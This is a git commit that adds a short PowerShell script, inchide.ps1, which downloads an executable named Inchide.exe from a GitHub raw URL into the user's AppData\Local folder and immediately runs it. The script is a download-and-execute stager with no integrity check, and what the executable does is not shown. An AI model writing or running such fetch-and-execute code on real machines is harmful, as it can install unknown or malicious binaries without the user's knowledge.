851c5a38518d046b0b190ded12b900efc6cb4768
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-22 18:28:53 +0300

    Create inchide.ps1

---
+++ Inchide/inchide.ps1
@@ -0,0 +1,5 @@
+$x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
+$y = "$env:USERPROFILE\AppData\Local\inchide.exe"
+
+Invoke-WebRequest -Uri $x -OutFile $y
+Start-Process -FilePath $y
